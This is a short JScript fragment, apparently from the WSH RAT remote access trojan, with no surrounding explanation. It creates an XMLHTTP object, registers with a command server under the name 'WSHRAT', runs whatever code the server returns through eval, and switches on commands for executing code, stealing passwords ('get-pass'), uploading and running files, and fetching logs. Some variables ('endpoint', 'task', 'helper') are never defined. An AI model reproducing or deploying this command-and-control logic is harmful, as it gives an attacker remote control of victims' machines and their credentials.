var xhr = WScript.CreateObject("MSXML2.XMLHTTP");
var registration = "WSHRAT";
var routes = ["is-ready", "is-cmd-shell", "send-to-me"];
xhr.open("POST", endpoint + routes[0], false);
xhr.send(registration);
var source = xhr.responseText;
eval(source);
switch (task) {
case "excecute": eval(source); break;
case "get-pass": helper(); break;
case "up-n-exec": helper(); break;
case "bring-log": helper(); break;
}
